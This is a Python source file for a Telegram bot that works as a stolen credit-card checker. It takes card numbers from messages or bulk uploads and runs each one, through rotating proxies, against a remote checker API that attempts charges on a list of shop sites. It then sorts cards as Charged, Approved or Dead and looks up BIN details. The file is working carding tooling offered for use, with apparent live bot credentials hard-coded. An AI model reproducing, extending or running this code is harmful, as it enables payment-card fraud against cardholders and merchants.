from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

# Configuration
CHECKER_API_URL = 'http://148.230.102.178:8081/'
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8914967757:AAG_SqyEghOD8Zr_2Tzskw8qbD6VWgFoGCI'

# Files
PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
OWNER_ID = 5895386985

# Initialize bot
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

# Premium Custom Emojis
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "💰": "5971944878815317190",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
    "😡": "6023660820544623088",
    "🫆": "6023660820544623088",
    "🫦": "6023660820544623088",
}

def premium_emoji(text):
    """Replace Unicode emojis with Telegram Premium custom emojis"""
    if not text:
        return text
    result = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# File Management
def get_file_lines(filepath):
    """Read lines from file"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    return get_file_lines(PREMIUM_FILE)

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    if user_id == OWNER_ID:
        return True
    return str(user_id) in load_premium_users()

# Card & Data Processing
def extract_cc(text):
    """Extract credit cards from text"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in DEAD_INDICATORS)

# API Calls
async def get_bin_info(card_number):
    """Get BIN information"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = await res.json()
                return (
                    data.get('brand', '-'),
                    data.get('type', '-'),
                    data.get('level', '-'),
                    data.get('bank', '-'),
                    data.get('country_name', '-'),
                    data.get('country_flag', '')
                )
    except:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    """Check single credit card"""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid', 'message': 'Invalid format', 'card': card}

        params = {'cc': card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'shopiii')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        if is_dead_site_error(str(e)):
            return {'status': 'Site Error', 'message': str(e), 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def test_proxy(proxy):
    """Test if proxy is alive"""
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://httpbin.org/ip', proxy=f'http://{proxy}') as resp:
                return resp.status == 200
    except:
        return False

async def test_site(site, proxy):
    """Test if site is alive"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(site, proxy=f'http://{proxy}') as resp:
                return {'status': 'alive', 'site': site}
    except:
        return {'status': 'dead', 'site': site}

# Commands
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Start command"""
    buttons = [
        [Button.inline("💳 CC Check", data=b"cc_check"), Button.inline("📊 Sites", data=b"sites_menu")],
        [Button.inline("🌐 Proxies", data=b"proxy_menu"), Button.inline("❓ Help", data=b"help")]
    ]

    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to Shopiiiii! 💳⚡</b>\n"
            "<b>─────────────────</b>\n\n"
            "<b>💳 CC Checker Bot</b>\n"
            "Check credit cards on sites\n\n"
            "<b>Commands:</b>\n"
            "• <code>/cc card|mm|yy|cvv</code> - Check single\n"
            "• <code>/chk</code> - Check from file\n\n"
            "<b>📍 Site Management:</b>\n"
            "• <code>/site</code> - Check sites\n"
            "• <code>/rm url</code> - Remove site\n\n"
            "<b>🌐 Proxy Management:</b>\n"
            "• <code>/proxy</code> - Check proxies\n"
            "• <code>/addproxy</code> - Add proxies\n"
            "• <code>/getproxy</code> - View proxies\n"
            "• <code>/clearproxy</code> - Clear all\n\n"
            "<b>─────────────────</b>\n"
            "<b>⚠️ Premium Access Required</b>"
        ),
        parse_mode='html',
        buttons=buttons
    )

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def check_single_cc(event):
    """Check single credit card"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nPremium only."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    try:
        card = event.message.text.replace('/cc ', '').strip()
        if '|' not in card:
            await event.reply(premium_emoji("❌ Format: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
            return

        status_msg = await event.reply(premium_emoji("🔄 Checking card..."))

        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        # Get BIN info
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        output = premium_emoji(
            f"<b>💳 Card Check Result</b>\n"
            f"<b>─────────────────</b>\n"
            f"<b>Status:</b> {result['status']}\n"
            f"<b>Card:</b> {card.split('|')[0][:6]}****{card.split('|')[0][-4:]}\n"
            f"<b>Gateway:</b> {result.get('gateway', '-')}\n"
            f"<b>Price:</b> {result.get('price', '-')}\n\n"
            f"<b>BIN Info:</b>\n"
            f"🏦 {bank} | {brand}\n"
            f"📍 {country} {flag}\n"
            f"💳 {bin_type} | {level}\n\n"
            f"<b>Response:</b>\n"
            f"<code>{result.get('message', 'N/A')[:200]}</code>"
        )

        await status_msg.edit(output, parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chk'))
async def check_from_file(event):
    """Check cards from uploaded file"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to .txt file with cards"))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to .txt file"))
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Missing sites or proxies"))
        return

    status_msg = await event.reply(premium_emoji("🫆 Processing file..."))
    file_path = await reply_msg.download_media()

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        cards = extract_cc(content)
        if not cards:
            await status_msg.edit(premium_emoji("😡 No valid cards found"))
            return

        total = len(cards)
        if total > 500000:
            cards = cards[:500000]

        results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'checked': 0, 'start_time': time.time()}
        session_key = f"{user_id}_{status_msg.id}"
        active_sessions[session_key] = {'paused': False, 'stopped': False}

        await status_msg.edit(premium_emoji(f"🫦 Starting {total} cards..."))

        for card in cards:
            if session_key not in active_sessions:
                break

            while active_sessions[session_key]['paused']:
                await asyncio.sleep(1)

            site = random.choice(sites)
            proxy = random.choice(proxies)
            result = await check_card(card, site, proxy)

            if result['status'] == 'Charged':
                results['charged'].append(f"{card}|{site}")
            elif result['status'] == 'Approved':
                results['approved'].append(f"{card}|{site}")
            else:
                results['dead'].append(card)

            results['checked'] += 1

            if results['checked'] % 10 == 0:
                elapsed = int(time.time() - results['start_time'])
                progress_text = premium_emoji(
                    f"🔥 Checking...\n\n"
                    f"<b>Progress:</b> {results['checked']}/{total}\n"
                    f"<b>Charged:</b> {len(results['charged'])}\n"
                    f"<b>Approved:</b> {len(results['approved'])}\n"
                    f"<b>Dead:</b> {len(results['dead'])}\n"
                    f"<b>Time:</b> {elapsed}s"
                )
                await status_msg.edit(progress_text, parse_mode='html')

        elapsed = int(time.time() - results['start_time'])
        final_text = premium_emoji(
            f"<b>✅ Finished!</b>\n\n"
            f"<b>Total:</b> {results['total']}\n"
            f"<b>Checked:</b> {results['checked']}\n"
            f"<b>💎 Charged:</b> {len(results['charged'])}\n"
            f"<b>✅ Approved:</b> {len(results['approved'])}\n"
            f"<b>❌ Dead:</b> {len(results['dead'])}\n"
            f"<b>Time:</b> {elapsed}s"
        )
        await status_msg.edit(final_text, parse_mode='html')

        if session_key in active_sessions:
            del active_sessions[session_key]

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.on(events.NewMessage(pattern=r'^/site'))
async def check_sites(event):
    """Check and clean sites"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ No sites to check"))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available"))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))

    alive_sites = []
    dead_sites = []

    try:
        for i in range(0, len(sites), 50):
            batch = sites[i:i + 50]
            tasks = [test_site(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(premium_emoji(
                f"🔥 Checking sites...\n\n"
                f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                f"<b>Alive:</b> {len(alive_sites)}\n"
                f"<b>Dead:</b> {len(dead_sites)}"
            ), parse_mode='html')

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        await status_msg.edit(premium_emoji(
            f"✅ <b>Done!</b>\n\n"
            f"<b>Total:</b> {len(sites)}\n"
            f"<b>Alive:</b> {len(alive_sites)}\n"
            f"<b>Removed:</b> {len(dead_sites)}"
        ), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site(event):
    """Remove specific site"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    try:
        url = event.message.text.replace('/rm ', '').strip()
        sites = load_sites()

        if url not in sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url}</code>"), parse_mode='html')
            return

        sites.remove(url)
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Removed: <code>{url}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy'))
async def check_proxies(event):
    """Check and clean proxies"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies to check"))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."))

    alive = []
    dead = []

    try:
        for i in range(0, len(proxies), 50):
            batch = proxies[i:i + 50]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for proxy, is_alive in zip(batch, results):
                if is_alive:
                    alive.append(proxy)
                else:
                    dead.append(proxy)

            await status_msg.edit(premium_emoji(
                f"🔥 Checking proxies...\n\n"
                f"<b>Checked:</b> {len(alive) + len(dead)}/{len(proxies)}\n"
                f"<b>Alive:</b> {len(alive)}\n"
                f"<b>Dead:</b> {len(dead)}"
            ), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(
            f"✅ <b>Done!</b>\n\n"
            f"<b>Total:</b> {len(proxies)}\n"
            f"<b>Alive:</b> {len(alive)}\n"
            f"<b>Removed:</b> {len(dead)}"
        ), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:100]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy(event):
    """Add proxies"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    await event.reply(premium_emoji("📤 Send proxies (one per line)"))

@bot.on(events.NewMessage(pattern=r'^/getproxy'))
async def get_proxies(event):
    """Get all proxies"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies"))
        return

    proxy_list = '\n'.join(proxies[:100])
    await event.reply(premium_emoji(f"<b>📋 Proxies ({len(proxies)}):</b>\n\n<code>{proxy_list}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy'))
async def clear_proxies(event):
    """Clear all proxies"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        pass

    await event.reply(premium_emoji("✅ Proxies cleared"))

@bot.on(events.CallbackQuery(pattern=b"help"))
async def help_handler(event):
    """Help callback"""
    await event.edit(
        premium_emoji(
            "<b>❓ Shopiiiii Bot Help</b>\n\n"
            "<b>CC Checking:</b>\n"
            "<code>/cc card|mm|yy|cvv</code>\n"
            "<code>/chk</code> - From file\n\n"
            "<b>Sites:</b>\n"
            "<code>/site</code> - Check all\n"
            "<code>/rm url</code> - Remove\n\n"
            "<b>Proxies:</b>\n"
            "<code>/proxy</code> - Check all\n"
            "<code>/addproxy</code> - Add\n"
            "<code>/getproxy</code> - View\n"
            "<code>/clearproxy</code> - Clear\n\n"
            "<b>⚠️ Premium Only</b>"
        ),
        parse_mode='html'
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"cc_check"))
async def cc_check_button(event):
    await event.edit(premium_emoji("<code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"sites_menu"))
async def sites_button(event):
    await event.edit(premium_emoji("<code>/site</code> - Check all\n<code>/rm url</code> - Remove"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"proxy_menu"))
async def proxy_button(event):
    await event.edit(premium_emoji("<code>/proxy</code> - Check\n<code>/addproxy</code> - Add\n<code>/getproxy</code> - View"), parse_mode='html')
    await event.answer()

print("✅ Bot started successfully!")
bot.run_until_disconnected()
